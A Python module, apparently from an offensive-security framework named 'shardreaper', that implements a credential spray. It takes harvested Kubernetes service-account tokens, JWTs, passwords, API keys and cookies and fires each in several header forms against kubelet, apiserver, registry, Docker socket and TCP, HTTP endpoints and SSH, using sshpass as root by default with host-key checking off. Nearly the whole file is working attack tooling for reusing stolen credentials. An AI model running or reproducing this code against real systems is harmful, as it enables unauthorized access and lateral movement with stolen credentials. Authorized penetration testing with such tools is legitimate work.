#!/usr/bin/env python3
"""
spray.py — token spray: every harvested credential against every
authenticated surface on the box, with authn/authz differential testing.

Post-Cobblestone lessons 11-12, enforced in code:

* The kubelet miss is the CANONICAL case: a harvested SA token / password /
  JWT is never filed away — it is automatically fired against the kubelet
  (10250 /pods + exec), the apiserver, registry APIs, SSH, the docker socket
  and every discovered HTTP surface, with ALL protocol variants (Bearer,
  Basic, X-Api-Key, cookie, query param).
* 401 (unauthenticated) triggers an automatic retry with EVERY held
  credential — a credential is only dead when it 401s everywhere.
* Responses are classified distinctly and honestly:
    400 bad-request            — malformed/unsupported (websocket upgrade
                                 failures land here, not in 403)
    401 unauthenticated        — retry with all held credentials
    403 protocol-mismatch      — websocket/subprotocol rejection: NOT RBAC,
                                 NEVER reported as an authorization denial
    403 rbac-denial            — the credential authenticated but was denied
    403 forbidden-unknown      — not classifiable as either
    404 not-found              — surface absent (kubelet version, path)
    500 server-error           — retry-later candidate, not a denial
  A 403-with-subprotocol-mismatch is never equated with RBAC denial, and an
  RBAC denial is never downgraded to "no access" — it proves authentication.
* Successful probes become findings with evidence, and the credential is
  added to the engagement credential set so nothing is re-sprayed.
"""
import base64
import json
import os
import subprocess
from urllib.parse import urlparse

from .k8s import (KUBELET_PORT, APISERVER_PORT, REGISTRY_PORT,
                  DOCKER_TCP_PORT, _https_request, docker_socket_version)

CRED_TYPES = ("sa-token", "jwt", "password", "api-key", "bearer", "cookie")

# classification vocabulary — 400/401/403/404/500 are NEVER collapsed
WS_MARKERS = ("websocket", "subprotocol", "upgrade")
RBAC_MARKERS = ("forbidden", "unauthorized to", "cannot ", "denied", "rbac",
                "user=")


def classify_response(status, body, url=""):
    """Differential classifier. Returns (class, label). A 403 with a
    websocket/subprotocol body is a PROTOCOL mismatch — never RBAC."""
    b = (body or "").lower()
    if status == 400:
        if any(m in b for m in WS_MARKERS):
            return ("400-bad-request", "websocket/upgrade required — client "
                    "did not speak the exec protocol (not a denial)")
        return ("400-bad-request", "malformed request")
    if status == 401:
        return ("401-unauthenticated", "no credential accepted — retry with "
                "every held credential")
    if status == 403:
        if any(m in b for m in WS_MARKERS):
            return ("403-protocol-mismatch", "subprotocol/upgrade rejection — "
                    "protocol mismatch, NOT an RBAC denial; retry with the "
                    "correct channel subprotocol")
        if any(m in b for m in RBAC_MARKERS):
            return ("403-rbac-denial", "credential AUTHENTICATED but was "
                    "denied authorization — proof of identity, keep the token")
        return ("403-forbidden-unknown", "forbidden, unclassifiable — inspect "
                "body before concluding either way")
    if status == 404:
        return ("404-not-found", "surface/path absent (version or API gap)")
    if status == 500:
        return ("500-server-error", "server-side failure — retry-later "
                "candidate, not a denial")
    if status and status < 400:
        return ("2xx-ok", "accepted — credential valid on this surface")
    return (f"{status}-unknown", "unclassified")


# ---------------- credential set ----------------
def load_credentials(eng=None, files=(), state_creds=None):
    """Harvested credential set: engagement state + findings ledger +
    explicit creds files (JSON list, 'type:value' lines, or raw tokens)."""
    creds = list(state_creds or [])
    if eng is not None:
        for c in eng.state.get("credentials", []):
            if isinstance(c, dict) and c.get("value"):
                creds.append(c)
        try:
            from . import memory
            for rec in _ledger_rows():
                cls = (rec.get("class") or "").lower()
                if any(k in cls for k in ("credential", "password", "token",
                                          "sa-token", "jwt", "key")):
                    val = rec.get("evidence") or rec.get("title")
                    if isinstance(val, str) and len(val) > 6:
                        creds.append({"type": "jwt" if "." in val else "password",
                                      "value": val.split()[0], "source": "ledger"})
        except Exception:
            pass
    for path in files:
        try:
            raw = open(path, encoding="utf-8").read()
            if raw.lstrip().startswith("["):
                for c in json.loads(raw):
                    if isinstance(c, dict) and c.get("value"):
                        creds.append(c)
            else:
                for line in raw.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if ":" in line and line.split(":", 1)[0] in CRED_TYPES:
                        t, v = line.split(":", 1)
                        creds.append({"type": t, "value": v})
                    else:
                        creds.append({"type": "sa-token" if "." in line
                                      else "password", "value": line})
        except OSError as e:
            print(f"cannot read creds {path}: {e}")
    seen, out = set(), []
    for c in creds:
        if not isinstance(c, dict) or not c.get("value"):
            continue
        key = (c.get("type", "password"), c["value"])
        if key in seen:
            continue
        seen.add(key)
        out.append(c)
    return out


def _ledger_rows():
    try:
        from . import memory
        path = os.path.join(memory._root(), "findings.jsonl")
        with open(path, encoding="utf-8") as f:
            return [json.loads(l) for l in f if l.strip()]
    except (OSError, ValueError):
        return []


# ---------------- protocol variants ----------------
def request_forms(cred, surface_kind):
    """Every protocol variant a credential can be fired in. Returns a list
    of (headers_dict, note)."""
    value = cred.get("value", "")
    user = cred.get("user") or "root"
    kind = cred.get("type", "bearer")
    forms = []
    if kind in ("sa-token", "jwt", "bearer"):
        forms.append(({"Authorization": f"Bearer {value}"}, "bearer"))
        if kind == "jwt":
            forms.append(({"X-Api-Key": value}, "x-api-key"))
    if kind in ("sa-token", "jwt", "api-key"):
        if not forms:
            forms.append(({"Authorization": f"Bearer {value}"}, "bearer"))
        forms.append(({"X-Api-Key": value}, "x-api-key"))
        if surface_kind in ("kubelet", "apiserver"):
            forms.append(({"Authorization": f"Bearer {value}"}, "bearer"))
    if kind == "password":
        auth = base64.b64encode(f"{user}:{value}".encode()).decode()
        forms.append(({"Authorization": f"Basic {auth}"}, f"basic:{user}"))
        forms.append(({"Cookie": f"session={value}"}, "cookie"))
    if kind == "cookie":
        forms.append(({"Cookie": f"session={value}"}, "cookie"))
    if surface_kind == "registry":
        auth = base64.b64encode(f"{user}:{value}".encode()).decode()
        forms.append(({"Authorization": f"Basic {auth}"}, f"basic:{user}"))
    return forms


# ---------------- surface builder ----------------
def build_surfaces(eng):
    """Every authenticated surface on the box, from recon state."""
    hosts = set()
    for seed in eng.state.get("seeds", []):
        h = urlparse(seed if "://" in seed else "//" + seed).hostname or seed
        hosts.add(h)
    urls = []
    for t in eng.state.get("targets", []):
        hosts.add(t.get("host"))
        for u in t.get("urls", []):
            urls.append(u.get("url"))
        for sd in t.get("subdomains", []):
            hosts.add(sd)
    surfaces = []
    for h in sorted(hosts):
        if not h or h in ("localhost", "127.0.0.1", "::1"):
            continue
        surfaces.append({"kind": "kubelet", "host": h, "port": KUBELET_PORT,
                         "paths": ["/pods", "/runningpods/"],
                         "name": f"kubelet:{h}:{KUBELET_PORT}"})
        surfaces.append({"kind": "apiserver", "host": h, "port": APISERVER_PORT,
                         "paths": ["/api/v1/namespaces", "/version"],
                         "name": f"apiserver:{h}:{APISERVER_PORT}"})
        surfaces.append({"kind": "registry", "host": h, "port": REGISTRY_PORT,
                         "paths": ["/v2/"], "name": f"registry:{h}:{REGISTRY_PORT}"})
        surfaces.append({"kind": "docker-tcp", "host": h, "port": DOCKER_TCP_PORT,
                         "paths": ["/containers/json", "/version"],
                         "name": f"docker-tcp:{h}:{DOCKER_TCP_PORT}"})
    for u in urls:
        surfaces.append({"kind": "http", "host": "", "url": u, "paths": [],
                         "name": f"http:{u}"})
    surfaces.append({"kind": "docker-socket", "host": "", "paths": [],
                     "name": "docker-socket:/var/run/docker.sock"})
    return surfaces


def probe_surface(surface, headers=None, timeout=6):
    """One probe against one surface. Returns (status, body, note)."""
    if surface.get("kind") == "docker-socket":
        r = docker_socket_version(timeout=timeout)
        return r.get("status"), r.get("body", ""), "unix-socket"
    if surface.get("kind") == "http":
        try:
            r = _http_req(surface["url"], headers=headers, timeout=timeout)
            return r.get("status"), r.get("body", ""), "http"
        except OSError as e:
            return None, "", f"err:{e}"
    results = []
    for path in surface.get("paths", ["/"]):
        try:
            r = _https_request(surface["host"], surface["port"], path,
                               headers=headers, timeout=timeout)
            results.append(r)
        except OSError as e:
            results.append({"status": None, "body": "", "error": str(e)})
    # surface verdict: prefer the most informative result — a 401/403/2xx
    # beats a 404 (which may just mean the path variant is absent)
    ranked = sorted(results, key=lambda r: _rank(r.get("status")))
    best = ranked[0] if ranked else {"status": None, "body": ""}
    return best.get("status"), best.get("body", ""), "tcp"


def _rank(status):
    if status is None:
        return 9
    if status < 400:
        return 0
    if status in (401, 403):
        return 1
    if status in (400, 500):
        return 2
    return 3  # 404 etc


def _http_req(url, headers=None, timeout=6):
    u = urlparse(url)
    return _https_request(u.hostname, u.port or (443 if u.scheme == "https"
                                                 else 80),
                          u.path or "/", headers=headers, timeout=timeout)


# ---------------- SSH probe (optional, deterministic skip if no sshpass) -----
def ssh_probe(host, port, user, password, timeout=8):
    """Password login probe via sshpass. Returns (ok, note). Never raises."""
    if not _has_sshpass():
        return None, "sshpass missing — ssh surface skipped"
    try:
        p = subprocess.run(
            ["sshpass", "-p", password, "ssh",
             "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-o", "PreferredAuthentications=password", "-o",
             "PubkeyAuthentication=no", "-o", "NumberOfPasswordPrompts=1",
             "-o", f"ConnectTimeout={timeout}", "-p", str(port),
             f"{user}@{host}", "echo __SR_SSH_OK__"],
            capture_output=True, text=True, timeout=timeout + 5)
        ok = p.returncode == 0 and "__SR_SSH_OK__" in p.stdout
        return ok, "login" if ok else "denied"
    except (subprocess.TimeoutExpired, OSError) as e:
        return None, f"err:{e}"


def _has_sshpass():
    import shutil
    return shutil.which("sshpass") is not None or shutil.which("shpass") is not None


# ---------------- the spray ----------------
def mask(value):
    v = str(value or "")
    if len(v) <= 8:
        return v[:2] + "***"
    return v[:6] + "..." + v[-4:]


def spray(eng, creds=None, log=None, ssh=True, probe=None, timeout=6):
    """Fire every held credential against every authenticated surface.
    Baseline (unauthenticated) first; a 401 anywhere automatically triggers
    the full credential set. `probe` is injectable for tests."""
    log = log or (lambda m: None)
    probe = probe or probe_surface
    creds = creds or load_credentials(eng)
    surfaces = build_surfaces(eng)
    hits, tried = [], 0
    for surface in surfaces:
        status, body, note = probe(surface, headers=None, timeout=timeout)
        cls, label = classify_response(status, body, surface.get("name", ""))
        log(f"spray {surface['name']}: [{status}] {cls}")
        tried += 1
        if status is not None and status < 400:
            hits.append({"surface": surface["name"], "credential": None,
                         "status": status, "class": cls,
                         "note": f"UNAUTHENTICATED access ({label})"})
        # 401 -> automatically retry with EVERY held credential (lesson 12)
        if status in (401, 403) or cls in ("403-protocol-mismatch",
                                           "403-forbidden-unknown"):
            for cred in creds:
                for headers, form in request_forms(cred, surface.get("kind")):
                    st, bd, nt = probe(surface, headers=headers, timeout=timeout)
                    c2, l2 = classify_response(st, bd, surface["name"])
                    tried += 1
                    row = {"surface": surface["name"], "status": st,
                           "credential": f"{cred.get('type', '?')}:{mask(cred.get('value'))}",
                           "form": form, "class": c2, "label": l2}
                    if st is not None and st < 400:
                        row["hit"] = True
                        hits.append(row)
                        log(f"spray HIT {surface['name']} via {form} "
                            f"[{st}] {c2}", )
                    if st != 401:
                        break  # this credential got a verdict; next cred
    # ssh surface: password creds against every host:22
    if ssh and _has_sshpass():
        for cred in creds:
            if cred.get("type") != "password":
                continue
            for t in eng.state.get("targets", []):
                host = t.get("host")
                if not host or 22 not in (t.get("ports") or {}):
                    continue
                ok, note = ssh_probe(host, 22, cred.get("user") or "root",
                                     cred.get("value"), timeout=timeout)
                tried += 1
                if ok:
                    hits.append({"surface": f"ssh:{host}:22", "status": 0,
                                 "credential": f"password:{mask(cred.get('value'))}",
                                 "form": "ssh-password", "class": "2xx-ok",
                                 "hit": True})
                    log(f"spray HIT ssh:{host}:22 — password valid")
                else:
                    log(f"spray ssh:{host}:22 — {note}")
    return {"surfaces": len(surfaces), "probes": tried, "hits": hits,
            "credentials": len(creds)}


def hit_severity(hit):
    """Severity of a confirmed hit, by surface class."""
    s = hit.get("surface", "")
    if s.startswith("kubelet") or s.startswith("apiserver"):
        return "critical" if hit.get("credential") else "high"
    if s.startswith("ssh"):
        return "critical"
    if s.startswith("docker") or s.startswith("registry"):
        return "high"
    return "medium"


# ---------------- CLI ----------------
def cli_spray(args):
    from .state import Engagement
    base = os.path.abspath(args.dir)
    if not os.path.isfile(os.path.join(base, "state.json")):
        print(f"no engagement at {base} — run: shardreaper engage ...")
        return 1
    eng = Engagement.load(base)
    creds = load_credentials(eng, files=args.creds or [])
    if not creds:
        print("no held credentials — harvest first, or pass --creds file")
        return 2
    log = eng.log if hasattr(eng, "log") else (lambda m: print(m))
    result = spray(eng, creds, log=log, ssh=not args.no_ssh,
                   timeout=args.timeout)
    print(f"\nspray: {result['credentials']} credential(s) × "
          f"{result['surfaces']} surface(s) = {result['probes']} probes")
    for h in result["hits"]:
        print(f"  HIT [{hit_severity(h).upper():8s}] {h['surface']} "
              f"{h.get('credential') or 'unauthenticated'} [{h['status']}] "
              f"{h['class']}")
    out = os.path.join(base, "spray.json")
    with open(out, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=1)
    print(f"\nreport written: {out}")
    return 0 if result["hits"] else 3


def build_arg_parser(sub):
    p = sub.add_parser("spray", help="token spray: every held credential × "
                       "every authenticated surface (kubelet/apiserver/"
                       "registry/ssh/docker) with all protocol variants")
    p.add_argument("dir", help="engagement folder")
    p.add_argument("--creds", action="append", default=[],
                   help="credentials file (JSON list or type:value lines)")
    p.add_argument("--no-ssh", action="store_true", help="skip ssh password probes")
    p.add_argument("--timeout", type=float, default=6)
    p.set_defaults(fn=cli_spray)
    return p
